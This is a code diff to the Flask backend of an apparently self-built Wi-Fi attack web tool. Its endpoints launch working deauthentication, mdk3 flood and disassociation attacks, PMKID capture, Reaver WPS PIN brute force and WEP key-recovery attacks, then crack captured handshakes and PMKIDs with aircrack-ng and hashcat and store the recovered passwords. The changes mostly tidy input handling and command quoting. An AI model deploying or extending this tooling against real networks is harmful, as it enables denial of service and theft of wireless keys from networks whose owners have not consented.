@@ -1,10 +1,12 @@
-from os import listdir, pardir
-from os.path import abspath, dirname, isfile, join
+import os
+from os import listdir
+from os.path import isfile, join
+import shlex
 import threading
 import subprocess
 from markupsafe import escape
 from flask import request
-from app import app, config
+from app import app, config, BASE_DIR
 from werkzeug.utils import secure_filename
 
 #Variables
@@ -18,13 +20,18 @@ channel = ""
 
 from app.utils import *
 
+
+def resource(*parts):
+    """Absolute path to a resource folder/file inside backend/."""
+    return join(BASE_DIR, *parts)
+
+
 @app.get('/')
 def index():
     try:
-        mkdir = f'mkdir {path}'
-        subprocess.run(mkdir, check=True, shell=True, capture_output=True)
+        os.makedirs(path, exist_ok=True)
         return ret({"status": "OK"})
-    
+
     except Exception as e:
         # Manejar otras excepciones generales
         return ret({"status": f"Error creating the folder: {str(e)}"}, 500)
@@ -36,14 +43,14 @@ def getNetcardMon():
         output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
         netcards_list = output.stdout.decode().split('\n')[:-1]
         return ret({"netcards": netcards_list})
-    
+
     except Exception as e:
         return ret({"status": f"Error with netcards: {str(e)}"}, 500)
-    
+
 @app.post('/netcard')
 def setNetcardMon():
-    global netcardMon 
-    global scanning 
+    global netcardMon
+    global scanning
 
     try:
         data = req(request)
@@ -68,6 +75,7 @@ def stopNetcardMon():
 
     try:
         scanning = False
+        scan_active.clear()
         stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
         subprocess.run(stopServices, check=True, shell=True)
 
@@ -80,9 +88,22 @@ def stopNetcardMon():
     except Exception as e:
         return ret({"status": f"Error stoping Services: {str(e)}"}, 500)
 
+@app.get('/stopScan')
+def stopScan():
+    # Stop scanning but keep the interface in monitor mode.
+    global scanning
+    try:
+        scanning = False
+        scan_active.clear()
+        subprocess.run('killall -q airodump-ng 2>/dev/null', shell=True)
+        clean(path)
+        return ret({"status": "OK"})
+    except Exception as e:
+        return ret({"status": f"Error stopping scan: {str(e)}"}, 500)
+
 @app.get('/scan')
 def scan():
-    global scanning 
+    global scanning
     global netcardMon
     clean(path)
     try:
@@ -91,8 +112,9 @@ def scan():
         subprocess.Popen(startScan, shell=True)
 
         scanning = True
+        scan_active.set()
         threading.Thread(target=readScan).start()
-            
+
         return ret({"status":"OK"})
     except Exception as e:
         return ret({"status": f"Error scanning: {str(e)}"}, 500)
@@ -115,130 +137,233 @@ def target():
     except Exception as e:
         return ret({"status": f"Target selection error: {str(e)}"}, 500)
 
+def _start_capture():
+    """Start airodump-ng capturing the current target to dumpDataAttack-01.cap."""
+    subprocess.Popen(
+        f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} '
+        f'{netcardMon} > {path}/tempScan 2>&1',
+        shell=True,
+    )
+    sleep(3)
+
+
 @app.post('/attack/<int:id>')
 def attack(id):
     global scanning
+    data = req(request)
+    cap = f'{path}/dumpDataAttack-01.cap'
+    essidQ = shlex.quote(str(essid))
+
     try:
         clean(path, True)
-        airodumpKill = 'killall airodump-ng'
-        subprocess.run(airodumpKill, check=True, shell=True)
-
-        startScan = f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} {netcardMon} > {path}/tempScan'
-        subprocess.Popen(startScan, shell=True)
-
+        kill_tools()
         scanning = False
 
-        sleep(3)
+        # --- WPA/WPA2 with clients: force a 4-way handshake -----------------
+        if id in (0, 1, 2, 3, 4):
+            _start_capture()
 
-        match id:
-            #WPA/WPA2 With Clients
-            case 0: #Deauthentication
-                data = req(request)
-                nPackets = escape(data.get('n', ''))
-                attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
-                pass
-            case 1: #Fake DoS Attack
-                attack = f'mdk3 a -a {bssid} {netcardMon}'
-                pass
-            case 2: #Beacon Flood Mode Attack
-                fakeNet = escape(data.get('fn', ''))
-                attack = f'mdk3 b -f FakeNetworks/{fakeNet} -a -s 1000 -c {channel} {netcardMon}'
-                pass
-            case 3: #Disassociation Amok Mode Attack
-                attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
-                pass
-            case 4: #Michael Shutdown Explotation
-                attack = f'mdk3 m -t {bssid} {netcardMon}'
-                pass
+            if id == 0:  # Deauthentication
+                n = escape(data.get('n', '')) or '0'
+                acmd = f'aireplay-ng -0 {n} -a {bssid} {netcardMon}'
+            elif id == 1:  # Fake DoS (auth flood)
+                acmd = f'mdk3 a -a {bssid} {netcardMon}'
+            elif id == 2:  # Beacon flood
+                fakeNet = secure_filename(str(escape(data.get('fn', ''))))
+                acmd = (f'mdk3 b -f {shlex.quote(resource("FakeNetworks", fakeNet))} '
+                        f'-a -s 1000 -c {channel} {netcardMon}')
+            elif id == 3:  # Disassociation amok (blacklist the target)
+                blacklist = f'{path}/blacklist'
+                with open(blacklist, 'w') as f:
+                    f.write(f'{bssid}\n')
+                acmd = f'mdk3 d -b {shlex.quote(blacklist)} -c {channel} {netcardMon}'
+            else:  # id == 4, Michael shutdown
+                acmd = f'mdk3 m -t {bssid} {netcardMon}'
 
-            #WPA/WPA2 Without Clients
-            case 5: #PMKID
-                attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
-                extract = f'hcxpcaptool -z hashes captura'
-                pass
+            proc = subprocess.Popen(acmd, shell=True)
+            got = wait_for(lambda: handshake_captured(cap), HANDSHAKE_TIMEOUT)
+            proc.terminate()
+            kill_tools()
 
-            #WPS
-            case 6: #Reaver Pin Attack
-                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && reaver -i {netcardMon} -b {bssid} -c {channel} -N -L'
-                pass
+            if not got:
+                return ret({"status": "No handshake captured within the time limit"}, 500)
 
-            #WEP 
-            case 7: #Fake Authentication Attack
-                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {mac} {netcardMon}'
-                extract = f'aircrack-ng -b {bssid} {path}/dumpDataAttack-01.cap'
-                pass
-            case 8: #Fake Authentication Attack + Chopchop
-                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -4 -b {bssid} -h {mac} {netcardMon}'
-                packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
-                extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
-                pass
-            case 9: #Fake Authentication Attack + Fragmentation
-                attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -5 -b {bssid} -h {mac} {netcardMon}'
-                packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
-                extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
-                pass
+            dest = resource('hashDB', f'{essid}+{bssid}.cap')
+            run(f'cp {shlex.quote(cap)} {shlex.quote(dest)}')
+            return ret({"status": "OK", "message": "WPA handshake captured"})
 
-        subprocess.run(attack, check=True, shell=True)
+        # --- PMKID: clientless WPA/WPA2 capture -----------------------------
+        if id == 5:
+            pcap = f'{path}/pmkid.pcapng'
+            run(f'rm -f {shlex.quote(pcap)}')
+            run(f'timeout {PMKID_TIMEOUT} hcxdumptool -i {netcardMon} '
+                f'-o {shlex.quote(pcap)} --enable_status=1',
+                timeout=PMKID_TIMEOUT + 20)
+            kill_tools()
+
+            dest = resource('hashDB', f'{essid}+{bssid}.22000')
+            run(f'rm -f {shlex.quote(dest)}')
+            # Modern hcxtools first, fall back to the legacy tool name.
+            run(f'hcxpcapngtool -o {shlex.quote(dest)} {shlex.quote(pcap)}')
+            if not os.path.exists(dest) or os.path.getsize(dest) == 0:
+                run(f'hcxpcaptool -z {shlex.quote(dest)} {shlex.quote(pcap)}')
+
+            if not os.path.exists(dest) or os.path.getsize(dest) == 0:
+                return ret({"status": "No PMKID captured"}, 500)
+            return ret({"status": "OK", "message": "PMKID hash saved to the vault"})
+
+        # --- WPS: Reaver PIN brute-force ------------------------------------
+        if id == 6:
+            run(f'aireplay-ng -1 0 -e {essidQ} -a {bssid} -h {mac} {netcardMon}', timeout=60)
+            r = run(f'timeout {WPS_TIMEOUT} reaver -i {netcardMon} -b {bssid} '
+                    f'-c {channel} -vv -N -L',
+                    timeout=WPS_TIMEOUT + 30)
+            kill_tools()
+            out = r.stdout + r.stderr
+            pin = field_after(out, 'WPS PIN:').strip("'")
+            psk = field_after(out, 'WPA PSK:').strip("'")
+            if psk:
+                with open(resource('passDB', f'{essid}+{bssid}'), 'w') as f:
+                    f.write(psk)
+                return ret({"status": "OK", "message": f"WPS cracked — PIN {pin}, PSK {psk}"})
+            return ret({"status": f"WPS attack did not recover a key (PIN: {pin or 'n/a'})"}, 500)
+
+        # --- WEP: collect IVs and crack -------------------------------------
+        if id in (7, 8, 9):
+            _start_capture()
+            run(f'aireplay-ng -1 0 -e {essidQ} -a {bssid} -h {mac} {netcardMon}', timeout=60)
+
+            if id == 7:  # ARP-request replay
+                gen = subprocess.Popen(
+                    f'aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF '
+                    f'-b {bssid} -h {mac} {netcardMon}',
+                    shell=True)
+            else:  # Chopchop (-4) or fragmentation (-5) -> keystream -> forge ARP
+                mode = '-4' if id == 8 else '-5'
+                run(f'cd {shlex.quote(path)} && timeout 180 aireplay-ng {mode} '
+                    f'-b {bssid} -h {mac} {netcardMon}',
+                    timeout=200)
+                xor = newest_file(path, '*.xor')
+                if not xor:
+                    kill_tools()
+                    return ret({"status": "Could not obtain a keystream (.xor)"}, 500)
+                run(f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 '
+                    f'-l 255.255.255.255 -y {shlex.quote(xor)} -w {path}/pf',
+                    timeout=60)
+                gen = subprocess.Popen(
+                    f'aireplay-ng -2 -r {path}/pf {netcardMon}', shell=True)
+
+            key = wait_for(lambda: wep_key(bssid, cap), WEP_TIMEOUT, interval=15)
+            gen.terminate()
+            kill_tools()
+
+            if not key:
+                return ret({"status": "WEP key not recovered within the time limit"}, 500)
+            with open(resource('passDB', f'{essid}+{bssid}'), 'w') as f:
+                f.write(key)
+            return ret({"status": "OK", "message": f"WEP key recovered: {key}"})
+
+        return ret({"status": f"Unknown attack id: {id}"}, 400)
+
     except Exception as e:
+        kill_tools()
         return ret({"status": f"Error Attacking: {str(e)}"}, 500)
-        
-    try:
-        waitHandshake(path)
-        
-        #Finish scan
-        subprocess.run(airodumpKill, check=True, shell=True)
-
-        #Comprobar handshake
-        subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', shell=True)
-
-        #Guardar handshake
-        subprocess.run(f'cp "{path}/dumpDataAttack-01.cap" "hashDB/{essid}+{bssid}.cap"', shell=True)
-        
-        return ret({"status":"OK"})
-    except Exception as e:
-        return ret({"status": f"HandShake not captured: {str(e)}"}, 500)
 
 ###Cracking
 
 @app.get('/prepareCrack/<string:wordlist>')
 def preparer(wordlist):
     try:
-        wordlist = escape(wordlist)
+        wordlist = secure_filename(str(escape(wordlist)))
+        wordlistPath = resource('Wordlist', wordlist)
 
-        # Define DB
-        defineDB = f'pyrit -i Wordlist/{wordlist} import_passwords'
-        subprocess.run(defineDB, check=True, shell=True)
-
-        # Generate PMKs
-        generatePMKS = 'pyrit batch'
-        subprocess.run(generatePMKS, check=True, shell=True)
+        if not isfile(wordlistPath):
+            return ret({"status": f"Wordlist not found: {wordlist}"}, 404)
 
         return ret({"status": "OK"})
-    
+
     except Exception as e:
         return ret({"status": f"Preparing error: {str(e)}"}, 500)
 
-##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
 @app.get('/crack/<string:hash>')
 def cracker(hash):
     try:
-        
-        essid = hash.split('_')[0]
-        password = hash.replace(".cap", "")
+        hash = secure_filename(str(escape(hash)))
+        wordlist = secure_filename(str(escape(request.args.get('wordlist', ''))))
 
-        # Define ESSID
-        defineDB = f'pyrit -e {essid} create_essid'
-        subprocess.run(defineDB, check=True, shell=True)
+        # Captures are stored as "{essid}+{bssid}.cap" (WPA handshake) or
+        # "{essid}+{bssid}.22000" (PMKID hash).
+        name = hash.rsplit('.', 1)[0]
+        capPath = resource('hashDB', hash)
+        passPath = resource('passDB', name)
 
-        startCrack = f'pyrit -r hashDB/{hash} attack_db > {path}/{password}'
-        subprocess.run(startCrack, check=True, shell=True)
+        # PMKID -> hashcat (mode 22000).
+        if hash.endswith('.22000'):
+            if not wordlist:
+                return ret({"status": "A wordlist is required to crack a PMKID"}, 400)
+            wlPath = resource('Wordlist', wordlist)
+            outPath = join(path, f'{name}.out')
+            run(f'rm -f {shlex.quote(outPath)}')
+            run(f'hashcat -m 22000 {shlex.quote(capPath)} {shlex.quote(wlPath)} '
+                f'-o {shlex.quote(outPath)} --outfile-format 2 --potfile-disable --quiet')
 
-        extractPassword(f'{path}/{password}', f'passDB/{password}')
+            password = ''
+            if os.path.exists(outPath):
+                with open(outPath) as f:
+                    password = f.readline().strip()
+            if not password:
+                return ret({"status": "PMKID not cracked with this wordlist"}, 500)
+            with open(passPath, 'w') as f:
+                f.write(password)
+            return ret({"status": "OK", "message": f"Key found: {password}"})
 
-        return ret({"status": "OK"})
+        # WPA handshake -> aircrack-ng. "-l" writes the recovered key to a file.
+        if not wordlist:
+            return ret({"status": "A wordlist is required to crack a handshake"}, 400)
+        wlPath = resource('Wordlist', wordlist)
+        bssid = name.split('+', 1)[1] if '+' in name else ''
+        keyPath = join(path, f'{name}.key')
+        run(f'rm -f {shlex.quote(keyPath)}')
+        run(f'aircrack-ng -w {shlex.quote(wlPath)} -b {shlex.quote(bssid)} '
+            f'-l {shlex.quote(keyPath)} {shlex.quote(capPath)} < /dev/null')
+
+        password = ''
+        if os.path.exists(keyPath):
+            with open(keyPath) as f:
+                password = f.read().strip()
+        if not password:
+            return ret({"status": "Handshake not cracked with this wordlist"}, 500)
+        with open(passPath, 'w') as f:
+            f.write(password)
+        return ret({"status": "OK", "message": f"Key found: {password}"})
 
     except Exception as e:
         return ret({"status": f"Cracking error: {str(e)}"}, 500)
+
+
+##Read the contents of a stored file (wordlists, fake networks, ...)
+@app.get('/file/<string:list>/<path:filename>')
+def readFileContent(list, filename):
+    try:
+        list = allowed_list(list)
+        filename = secure_filename(str(escape(filename)))
+        target = resource(list, filename)
+
+        if not isfile(target):
+            return ret({"status": "File not found"}, 404)
+
+        # Wordlists can be huge; cap how much we send back to the browser.
+        max_bytes = 256 * 1024
+        with open(target, 'r', errors='replace') as f:
+            content = f.read(max_bytes + 1)
+        truncated = len(content) > max_bytes
+        if truncated:
+            content = content[:max_bytes]
+
+        return ret({"content": content, "truncated": truncated})
+
+    except Exception as e:
+        return ret({"status": f"Error reading file: {str(e)}"}, 500)
 
 
 ###Uploads
@@ -247,11 +372,12 @@ def cracker(hash):
 @app.post('/list/<string:list>')
 def setList(list):
     try:
-        list = escape(list)
+        list = allowed_list(list)
         f = request.files['file']
-        f.save(f'{list}/{secure_filename(f.filename)}')
+        filename = secure_filename(f.filename)
+        f.save(resource(list, filename))
 
-        return ret({"status": f"saved on {list}/{secure_filename(f.filename)}"})
+        return ret({"status": f"saved on {list}/{filename}"})
 
     except Exception as e:
         return ret({"status": f"Error uploading file: {str(e)}"}, 500)
@@ -259,13 +385,14 @@ def setList(list):
 @app.post('/deleteFile/<string:list>')
 def deleteFile(list):
     try:
-        list = escape(list)
+        list = allowed_list(list)
         data = req(request)
-        f = escape(data.get('file', ''))
-        delete = f'rm {list}/{f}'
-        subprocess.run(delete, check=True, capture_output=True, text=True, shell=True)
+        f = secure_filename(str(escape(data.get('file', ''))))
+        target = resource(list, f)
+        if isfile(target):
+            os.remove(target)
 
-        return ret({"status": f"deleted on {list}/{secure_filename(f)}"})
+        return ret({"status": f"deleted on {list}/{f}"})
 
     except Exception as e:
         return ret({"status": f"Error deleting file: {str(e)}"}, 500)
@@ -273,17 +400,32 @@ def deleteFile(list):
 @app.get('/list/<string:list>')
 def getLists(list):
     try:
-        list = escape(list)
-        current_directory = abspath(dirname(__file__))
-        parent_directory = abspath(join(current_directory, pardir))
-        folder_path = join(parent_directory, list)
+        list = allowed_list(list)
+        folder_path = resource(list)
 
         file_list = [f for f in listdir(folder_path) if isfile(join(folder_path, f))]
 
         if list == "passDB":
-            key_list = [{'apName': f.split('+')[0], 'bssid': f.split('+')[1], 'password': readPasswordFromFile(join(folder_path, f))} for f in file_list]
+            key_list = [
+                {
+                    'apName': f.split('+')[0],
+                    'bssid': f.split('+')[1] if '+' in f else '',
+                    'password': readPasswordFromFile(join(folder_path, f)),
+                    'file': f,
+                }
+                for f in file_list
+            ]
         elif list == "hashDB":
-            key_list = [{'apName': f.split('+')[0], 'bssid': f.split('+')[1].replace('.cap', ''), 'password': None} for f in file_list]
+            key_list = [
+                {
+                    'apName': f.split('+')[0],
+                    # Strip the .cap / .22000 extension from the BSSID.
+                    'bssid': (f.split('+')[1] if '+' in f else '').rsplit('.', 1)[0],
+                    'password': None,
+                    'file': f,
+                }
+                for f in file_list
+            ]
         else:
             key_list = file_list
 
